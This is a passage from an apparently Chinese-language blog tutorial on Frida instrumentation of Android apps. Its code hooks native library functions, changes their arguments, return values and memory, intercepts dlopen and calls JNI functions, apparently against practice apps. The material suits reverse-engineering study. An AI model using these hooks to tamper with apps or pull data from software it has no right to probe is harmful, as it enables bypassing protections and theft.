class="string">&quot;\t&quot;</span>,superClass.<span class="title function_">toString</span>());</span><br><span class="line">                    superClass=superClass.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;findAllSuperclasses send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找父类的子类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findChildBySuper</span>(<span class="params">packnames,superClassName</span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">class_name</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.<span class="title function_">indexOf</span>(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(class_name);</span><br><span class="line">                <span class="keyword">var</span> superClass=clazz.<span class="property">class</span>.<span class="title function_">getSuperclass</span>();              </span><br><span class="line">          <span class="keyword">while</span>(superClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(superClass.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(superClassName)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found:&quot;</span>,class_name,superClass); </span><br><span class="line">                    &#125;</span><br><span class="line">                    superClass=superClass.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;findAllSuperclasses send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Hook-so层"><a href="#Hook-so层" class="headerlink" title="Hook so层"></a>Hook so层</h1><h2 id="一些frida函数简单使用"><a href="#一些frida函数简单使用" class="headerlink" title="一些frida函数简单使用"></a>一些frida函数简单使用</h2><ul><li><p>Java.vm.getEnv() / Java.vm.tryGetEnv：frida中获取JNIEnv对象</p></li><li><p>Java.vm.getEnv().newStringUtf(str)：string转化为jstring</p></li><li><p>Java.vm.getEnv().getStringUtfChars(result, null).readCString()：jstring转化为string</p></li><li><p>Memory.allocUtf8String(“xiaoweigege”)：so中定义一个字符串</p></li><li><p>ptr(result).readCString()：c中字符串转化为jstring</p></li><li><p>GetByteArrayElements(): jArray转化为cArray</p></li><li><p>Java.retain(instance)：参数是一个参数对象 当对象被摧毁时 通过赋值仍然可以调用这个对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将函数地址定义成一个函数能在js中进行调用</span></span><br><span class="line"><span class="keyword">let</span> so_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&#x27;libxiaowei.so&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> encrypt_addr = so_addr.<span class="title function_">add</span>(<span class="number">0x42B0</span>);</span><br><span class="line"><span class="keyword">let</span> encrypt_fun = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(encrypt_addr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">let</span> cstring = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(str);</span><br><span class="line"><span class="keyword">let</span> result = <span class="title function_">encrypt_fun</span>(cstring);</span><br></pre></td></tr></table></figure></li><li><p>Module.load(‘/data/local/tmp/libxiaowei.so’)：在任意apk中加载so</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> hexA = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line">        hexA.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBytes</span>(<span class="params">str</span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> ch, st, re = []; </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++ ) &#123; </span><br><span class="line">        ch = str.<span class="title function_">charCodeAt</span>(i);  </span><br><span class="line">        st = [];                 </span><br><span class="line">        <span class="keyword">do</span> &#123;  </span><br><span class="line">            st.<span class="title function_">push</span>( ch &amp; <span class="number">0xFF</span> );  </span><br><span class="line">            ch = ch &gt;&gt; <span class="number">8</span>;          </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">while</span> ( ch );  </span><br><span class="line">        re = re.<span class="title function_">concat</span>( st.<span class="title function_">reverse</span>() ); </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> re;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举导入导出表"><a href="#枚举导入导出表" class="headerlink" title="枚举导入导出表"></a>枚举导入导出表</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> imports = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; imports.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(imports[i].<span class="property">name</span> == <span class="string">&quot;strncat&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(imports[i]));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(imports[i].<span class="property">address</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">exports</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>[i]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var helloAddr = Module.findExportByName(&quot;libxiaojianbang.so&quot;, &quot;Java_com_xiaojianbang_app_NativeHelper_helloFromC&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(helloAddr);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//枚举符号表 Module.enumerateSymbols(&#x27;xxx.so&#x27;)；</span></span><br></pre></td></tr></table></figure><h2 id="Hook导出函数"><a href="#Hook导出函数" class="headerlink" title="Hook导出函数"></a>Hook导出函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_add&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(args[0]);</span></span><br><span class="line">                <span class="comment">//console.log(args[1]);</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>]);</span><br><span class="line">                <span class="comment">//console.log(this.context.x2);</span></span><br><span class="line">                <span class="comment">//console.log(args[3]);</span></span><br><span class="line">                <span class="comment">//console.log(args[4].toInt32());</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(retval);</span></span><br><span class="line">                <span class="comment">//console.log(&quot;retval&quot;, retval.toInt32());</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//toInt32 转换为32有符号整数</span></span><br></pre></td></tr></table></figure><h2 id="修改函数参数返回值"><a href="#修改函数参数返回值" class="headerlink" title="修改函数参数返回值"></a>修改函数参数返回值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_add&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="comment">//修改函数参数的时候，如果参数是字符串 没法修改</span></span><br><span class="line">                args[<span class="number">2</span>] = <span class="title function_">ptr</span>(<span class="number">1000</span>); <span class="comment">//new NativePointer()  修改参数为1000</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">toInt32</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">3</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">4</span>]);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">20000</span>);   <span class="comment">//修改返回值为2000</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval&quot;</span>, retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改参数用ptr() 修改返回值 用 .replace()</span></span><br></pre></td></tr></table></figure><h2 id="Hook未导出函数"><a href="#Hook未导出函数" class="headerlink" title="Hook未导出函数"></a>Hook未导出函数</h2><p>当是32位.so是，为导出函数的地址+1，也可以看函数十六进制是否是2个 如果是两个就是thumb</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest4</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> funcAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x23F4</span>); <span class="comment">//函数地址计算 thumb+1 ARM不加</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(funcAddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(funcAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(retval));   <span class="comment">//打印出内存结构 </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取指针参数返回值"><a href="#获取指针参数返回值" class="headerlink" title="获取指针参数返回值"></a>获取指针参数返回值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> sub_208C = soAddr.<span class="title function_">add</span>(<span class="number">0x208C</span>); <span class="comment">//函数地址计算 thumb+1 ARM不加</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_208C);</span><br><span class="line">    <span class="keyword">if</span>(sub_208C != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_208C,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">args1</span> = args[<span class="number">1</span>];   <span class="comment">//回去第二个参数值</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="comment">//修改内存数据</span></span><br><span class="line">                <span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">args1</span>).<span class="title function_">writeByteArray</span>(<span class="title function_">hexToBytes</span>(<span class="string">&quot;0123456789abcdef0123456789abcdef&quot;</span>));</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改内存数据"><a href="#修改内存数据" class="headerlink" title="修改内存数据"></a>修改内存数据</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">if</span>(soAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">//读取指定地址的字符串 dump指定内存</span></span><br><span class="line">        <span class="comment">//console.log(soAddr.add(0x2C00).readCString());</span></span><br><span class="line">        <span class="comment">//console.log(hexdump(soAddr.add(0x2C00)));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//读内存</span></span><br><span class="line">        <span class="comment">//var strByte = soAddr.add(0x2C00).readByteArray(16); </span></span><br><span class="line">        <span class="comment">//console.log(strByte);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写内存</span></span><br><span class="line">        <span class="comment">//so|Addr.add(0x2C00).writeByteArray(stringToBytes(&quot;xiaojianbang&quot;)); </span></span><br><span class="line">        <span class="comment">//读取指定地址的字符串 dump指定内存</span></span><br><span class="line">        <span class="comment">//console.log(hexdump(soAddr.add(0x2C00)));  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//var bytes = Memory.readByteArray(soAddr.add(0x2C00), 16); //原先API</span></span><br><span class="line">        <span class="comment">//console.log(bytes);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-dlopen"><a href="#Hook-dlopen" class="headerlink" title="Hook dlopen"></a>Hook dlopen</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(dlopen);</span><br><span class="line">    <span class="keyword">if</span>(dlopen != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopen,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hookTest5</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新版本hook dlopen</span></span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(android_dlopen_ext);</span><br><span class="line">    <span class="keyword">if</span>(android_dlopen_ext != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();  <span class="comment">//dlopen函数第一个参数是.so路径</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hookTest5</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookTest6</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h2 id="主动调用JNI函数"><a href="#主动调用JNI函数" class="headerlink" title="主动调用JNI函数"></a>主动调用JNI函数</h2><p>当.so文件某个函数把cstring转换为jstring对象(newStringUtf)，不能打印内存数据，需要把他转化为cstring。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_helloFromC&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(funcAddr);</span><br><span class="line">    <span class="keyword">if</span>(funcAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">                <span class="keyword">var</span> jstr = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;bbs.125.la&quot;</span>);  <span class="comment">//主动调用jni函数 cstr转jstr</span></span><br><span class="line">                retval.<span class="title function_">replace</span>(jstr);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> cstr = env.<span class="title function_">getStringUtfChars</span>(jstr); <span class="comment">//主动调用 jstr转cstr</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(cstr));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-libart-so-来Hook-jni相关函数"><a href="#Hook-libart-so-来Hook-jni相关函数" class="headerlink" title="Hook libart.so 来Hook jni相关函数"></a>Hook libart.so 来Hook jni相关函数</h2><p>libart.so是art虚拟机，jni函数可以在libart.so的符号表中找到,也就是jni函数都在libart.so中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 